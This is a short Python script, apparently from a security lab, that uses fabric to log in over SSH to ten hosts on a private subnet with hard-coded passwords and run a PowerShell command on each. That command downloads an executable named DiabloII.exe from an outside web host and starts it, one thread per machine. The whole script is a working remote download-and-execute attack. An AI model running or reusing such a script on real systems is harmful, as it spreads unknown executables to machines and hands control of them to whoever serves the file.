from fabric import Connection
from Thread_Process import spawn_thread

def connect_ssh(ip, user, port, password, command):
	c = Connection(host = ip, user = user, port = port, connect_kwargs={"password":password})
	c.run(command)

def main():
	prefix = "192.168.230.5"
	passwords = ('50033fZ@','85896cP%','08362tM%','20098uH!','41879gY@','42877gW$','91544mZ?','57055oE#','86913kP#','85717aR-',)
	# command = "whoami"
	command = "cd Downloads & powershell ; (New-Object System.Net.WebClient).DownloadFile('http://inseclab.net/DiabloII.exe','C:\\Users\\user\\Downloads\\DiabloII.exe'); Start-Process 'C:\\Users\\user\\Downloads\\DiabloII.exe'"
	user = 'user'
	port = 22
	for i in range(10):
		ip = prefix + str(i+1)
		password = passwords[i]
		arguments = (ip, user, port, password, command,)
		spawn_thread(connect_ssh, arguments)

main()